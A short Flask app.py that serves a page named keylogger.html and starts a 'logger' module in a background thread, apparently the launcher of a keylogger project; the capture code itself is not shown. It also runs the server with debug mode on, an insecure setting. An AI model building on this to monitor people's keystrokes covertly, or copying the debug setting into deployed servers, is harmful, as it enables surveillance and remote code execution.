# app.py
from flask import Flask, render_template
from threading import Thread
import logger

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('/keylogger/keylogger.html')

def run_script():
    logger.run_script()

if __name__ == '__main__':
    # Create a separate thread for running the script
    script_thread = Thread(target=run_script)
    script_thread.start()

    # Run the Flask app
    app.run(debug=True)
